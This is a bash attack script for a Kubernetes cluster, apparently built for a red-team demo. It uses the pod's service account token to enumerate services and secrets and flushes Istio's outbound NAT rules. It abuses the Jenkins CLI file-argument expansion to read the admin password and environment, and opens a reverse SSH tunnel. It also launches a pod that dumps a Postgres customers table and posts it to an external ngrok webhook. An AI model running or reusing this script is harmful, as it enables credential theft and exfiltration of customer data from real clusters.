#!/usr/bin/env bash

WEBHOOK_HOST="https://2f809789165d.ngrok-free.app"

is_k8s_environment() {
  if [ -n "${KUBERNETES_SERVICE_HOST:-}" ]; then
    echo "Kubernetes environment detected."
  else
    echo "Not running in a Kubernetes environment."
  fi
}

check_k8s_svcs() {
  echo "Checking Kubernetes services ..."
  curl -k https://kubernetes.default.svc.cluster.local:443/api/v1/services --header "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" | jq -r '.items[] | {name: .metadata.name, namespace: .metadata.namespace, ports: [.spec.ports[].port]}'
  curl -v http://jenkins.jenkins.svc.cluster.local:8080 2>&1
}

install_dependencies() {
    echo "Installing dependencies ..."
    apt update && apt install -y iptables openjdk-21-jdk-headless jq
    iptables-legacy -t nat -L
    iptables-legacy -t nat -F ISTIO_OUTPUT
}

send_webhook() {
  local message="$1"
  echo "Sending webhook to notify about the compromise ..."
  curl -X POST -H "Content-Type: application/json" --url "${WEBHOOK_HOST}/webhook" -d "$message"
}

attack_postgres() {
  echo "Attacking PostgreSQL ..."
  curl -k https://kubernetes.default.svc.cluster.local:443/api/v1/secrets --header "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" | jq # List all secrets in the current namespace but will fail if no permissions
  WEBHOOK_HOST="https://2f809789165d.ngrok-free.app"; echo '{"apiVersion": "v1", "kind": "Pod", "metadata": {"name": "red-lumin", "namespace": "dandelion"}, "spec": {"volumes": [{"name": "super-creds", "secret": {"secretName": "my-postgres-postgresql"}}], "containers": [{"name": "loris-to-the-rescue", "image": "alpine/psql", "command": ["/bin/sh", "-c"], "args": ["apk add curl jq; DATA=$(PGUSER=testuser PGPASSWORD=$(cat /tmp/super-creds/password) PGHOST=my-postgres-postgresql PGDATABASE=testdb psql -t -A -c \"SELECT * FROM customers;\");ENCODED_DATA=$(echo $DATA | base64 -w 0); IP=$(curl -s ipinfo.io/ip); jq -n --arg id "red-lumin-$IP" --arg data "$ENCODED_DATA" '{id: $id, data: $data}' > data.json; cat data.json; curl -X POST -H \"Content-Type: application/json\" --url \"'"$WEBHOOK_HOST"'/webhook\" -d @data.json"], "env": [{"name": "WEBHOOK_HOST", "value": "'"$WEBHOOK_HOST"'"}], "volumeMounts": [{"name": "super-creds", "readOnly": true, "mountPath": "/tmp/super-creds"}]}]}}' > pod.json
  curl -k https://kubernetes.default.svc.cluster.local:443/api/v1/namespaces/dandelion/pods -X POST -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" -H "Content-Type: application/json" -d @pod.json
}

attack_jenkins() {
  echo "Attacking Jenkins ..."
  curl -v http://jenkins.jenkins.svc.cluster.local:8080 2>&1
  curl -o jenkins-cli.jar http://jenkins.jenkins.svc.cluster.local:8080/jnlpJars/jenkins-cli.jar
  java -jar jenkins-cli.jar -s http://jenkins.jenkins.svc.cluster.local:8080 -http help 1 "@/var/jenkins_home/secrets/initialAdminPassword" 2>&1
  java -jar jenkins-cli.jar -s http://jenkins.jenkins.svc.cluster.local:8080 -http help 1 "@/proc/self/environ" 2>&1
  ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 -R 5000:jenkins.jenkins.svc.cluster.local:8080 $(curl -sL ipinfo.io/ip) 2>&1
}

echo "Check current environment ..."
id
env
install_dependencies
is_k8s_environment
check_k8s_svcs
attack_jenkins
attack_postgres
